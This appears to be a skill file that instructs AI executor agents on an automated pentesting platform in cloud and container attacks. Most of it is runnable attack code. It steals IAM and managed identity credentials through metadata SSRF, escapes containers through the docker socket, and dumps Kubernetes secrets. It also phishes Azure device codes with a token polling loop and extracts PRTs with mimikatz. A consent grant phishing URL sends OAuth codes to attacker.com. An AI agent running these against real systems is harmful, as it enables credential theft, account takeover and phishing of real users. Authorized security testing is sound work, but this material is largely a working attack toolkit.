---
name: cloud-containers
description: Cloud and container security — metadata API, SSRF to cloud, container escapes, IAM misconfigs
allowed-tools: [Bash, Read, Write]
---
> **OOB callbacks (Tzar-Bot):** No Burp Collaborator MCP is wired into this platform. For out-of-band confirmation, executor agents should use **interactsh** — run `interactsh-client -json -o $OUTPUT_DIR/recon/interactsh.log` in a side terminal; it prints a unique `*.oast.fun` host and live-logs DNS/HTTP/SMTP hits. Set `COLLAB=<that-host>` and reuse it anywhere the per-class references under `reference/` mention Burp Collaborator or `$COLLAB`. Burp Collaborator stays valid if the operator has Burp open.

# Cloud and Container Security

Test cloud environments (AWS, Azure, GCP) and container infrastructure.

## Tools

| Tool | Purpose |
|------|---------|
| aws CLI | AWS API interaction |
| pacu | AWS exploitation framework |
| ScoutSuite | Multi-cloud security auditing |
| trivy | Container image vulnerability scanning |
| docker | Container inspection |
| kubectl | Kubernetes interaction |
| prowler | AWS security best practices |

## Cloud Metadata SSRF

```bash
# AWS metadata via SSRF
curl -s "TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "TARGET/fetch?url=http://169.254.169.254/latest/user-data"

# GCP metadata
curl -s "TARGET/fetch?url=http://169.254.169.254/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# Azure metadata
curl -s "TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
```

## AWS Enumeration

```bash
# With obtained credentials (from SSRF/leaked keys)
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
aws iam list-users 2>/dev/null
aws iam list-attached-user-policies --user-name $(aws iam list-users --query 'Users[0].UserName' --output text) 2>/dev/null
aws s3 ls 2>/dev/null
aws ec2 describe-instances 2>/dev/null | jq '.Reservations[].Instances[] | {id: .InstanceId, ip: .PublicIpAddress}'

# Public S3 buckets
aws s3 ls s3://TARGET_BUCKET --no-sign-request 2>/dev/null
```

## Container Escape Checks

```bash
# Check if running in a container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Over-privileged container
cat /proc/self/status | grep CapEff
# 0000003fffffffff = full capabilities = privileged

# Mounted docker socket
ls -la /var/run/docker.sock
# If exists: docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

# Writable cgroups escape (CVE-2019-5736 pattern)
cat /proc/1/environ | tr '\0' '\n' | head -20
```

## Container Image Scanning

```bash
trivy image TARGET_IMAGE:latest --format json > OUTPUT_DIR/logs/trivy-image.json
trivy image TARGET_IMAGE:latest --severity HIGH,CRITICAL > OUTPUT_DIR/logs/trivy-critical.txt

# Local filesystem scan
trivy fs /path/to/app --format json > OUTPUT_DIR/logs/trivy-fs.json
```

## Kubernetes

```bash
# If kubectl configured
kubectl get pods --all-namespaces 2>/dev/null
kubectl get secrets --all-namespaces 2>/dev/null
kubectl get clusterrolebindings -o wide 2>/dev/null | grep -i "system:anonymous\|system:unauthenticated"

# Check for unauthenticated API server
curl -sk https://TARGET_K8S:6443/api/v1/namespaces 2>/dev/null | jq '.items[].metadata.name'
curl -sk https://TARGET_K8S:6443/api/v1/secrets 2>/dev/null | jq '.'
```

## Azure AD Deep Testing

```bash
# Install tools
pip3 install roadrecon adal 2>/dev/null || true
sudo apt-get install -y bloodhound-python 2>/dev/null || true

TENANT="tenant.onmicrosoft.com"
CLIENT_ID="YOUR_APP_CLIENT_ID"    # or use device code flow
USER="user@tenant.onmicrosoft.com"
PASS="Password"

# ── Enumeration ───────────────────────────────────────────────────────────

# ROADtools — comprehensive Azure AD enumeration
roadrecon gather --username "$USER" --password "$PASS" \
  --tenant "$TENANT" --output "$OUTPUT_DIR/artifacts/roadrecon/"
roadrecon dump "$OUTPUT_DIR/artifacts/roadrecon/roadrecon.db" \
  > "$OUTPUT_DIR/artifacts/roadrecon/dump.json"

# AzureHound — BloodHound data collection for Azure
azurehound -u "$USER" -p "$PASS" list \
  --tenant "$TENANT" \
  -o "$OUTPUT_DIR/artifacts/azurehound.json" 2>/dev/null

# Ingest into BloodHound
sudo neo4j start && bloodhound &
# Import azurehound.json via GUI

# ── Device Code Phishing ─────────────────────────────────────────────────

# Step 1: Request a device code
curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=$CLIENT_ID&scope=openid profile email offline_access" \
  | jq '{user_code, verification_uri, message}' \
  | tee "$OUTPUT_DIR/logs/device-code.json"
# Send user_code to victim in phishing email: "Verify at https://microsoft.com/devicelogin"

# Step 2: Poll for token while victim enters code
CODE=$(jq -r '.device_code' "$OUTPUT_DIR/logs/device-code.json")
until TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=$CLIENT_ID&device_code=$CODE" \
  | jq -r '.access_token // empty'); [ -n "$TOKEN" ]; do
  sleep 5
done
echo "[+] Access token obtained"

# ── Primary Refresh Token (PRT) Abuse ────────────────────────────────────

# On compromised Windows host: extract PRT via mimikatz
# sekurlsa::cloudap  → retrieves PRT from lsass
# dpapi::cloudapkd   → decrypts the ProofOfPossession key

# Forge signed JWT from PRT (AADInternals):
# $prtToken = Get-AADIntAccessTokenForAADGraph -GetNonce
# $accessToken = Get-AADIntAccessTokenWithPRT -PRTToken $prtToken

# ── Conditional Access Bypass ────────────────────────────────────────────

# Check CA policies (requires Graph API access)
curl -s "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  -H "Authorization: Bearer $TOKEN" | jq '[.value[] | {id:.id, displayName:.displayName, state:.state}]' \
  | tee "$OUTPUT_DIR/artifacts/azure-ca-policies.json"

# Bypass technique: use compliant device claim (via PRT), or
# enumerate excluded users/groups/locations from policy definitions

# ── Managed Identity Token Theft ─────────────────────────────────────────

# From compromised Azure resource (VM, Function App, Container):
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?\
api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true" | jq '{access_token, expires_on, resource}' \
  | tee "$OUTPUT_DIR/artifacts/azure-managed-identity-token.json"

# Use token to enumerate subscriptions, resources
ACCESS_TOKEN=$(jq -r '.access_token' "$OUTPUT_DIR/artifacts/azure-managed-identity-token.json")
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[].subscriptionId'

# ── MicroBurst: Storage & Key Vault ──────────────────────────────────────

# Clone MicroBurst (PowerShell-based, run via pwsh on Linux)
git clone https://github.com/NetSPI/MicroBurst /opt/MicroBurst 2>/dev/null || true

# Enumerate storage accounts with PowerShell
pwsh -Command "
  Import-Module /opt/MicroBurst/Az/MicroBurst-Az.psm1
  Invoke-EnumerateAzureBlobs -Base $TENANT.split('.')[0]
" 2>/dev/null | tee "$OUTPUT_DIR/recon/azure-blobs.txt"

# Key Vault access (with valid token)
curl -s "https://management.azure.com/subscriptions/SUB_ID/resources?\
api-version=2021-04-01&\$filter=resourceType eq 'Microsoft.KeyVault/vaults'" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  | jq '.value[] | {name:.name, location:.location}'

# ── Illicit Consent Grant ────────────────────────────────────────────────

# Craft malicious OAuth app registration URL
ATTACKER_APP_CLIENT_ID="REGISTERED_APP_ID"
REDIRECT_URI="https://attacker.com/callback"

echo "Send victim this URL:"
echo "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/authorize?\
client_id=$ATTACKER_APP_CLIENT_ID\
&response_type=code\
&redirect_uri=$REDIRECT_URI\
&scope=https%3A%2F%2Fgraph.microsoft.com%2FMail.Read+https%3A%2F%2Fgraph.microsoft.com%2FContacts.Read\
&state=12345"
# If victim clicks Allow → attacker gets code → exchanges for persistent token
```

## Output

Cloud findings → `OUTPUT_DIR/findings/finding-NNN/`
IAM policies → `OUTPUT_DIR/artifacts/iam-*.json` (sanitize before committing)
Azure AD data → `OUTPUT_DIR/artifacts/roadrecon/`, `azurehound.json`
Managed identity tokens → `OUTPUT_DIR/artifacts/azure-managed-identity-token.json` (never commit)

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/hunt-cloud-misconfig.md` — Hunt cloud / infrastructure misconfigurations.
- `reference/hunt-k8s.md` — Hunt Kubernetes & Docker…
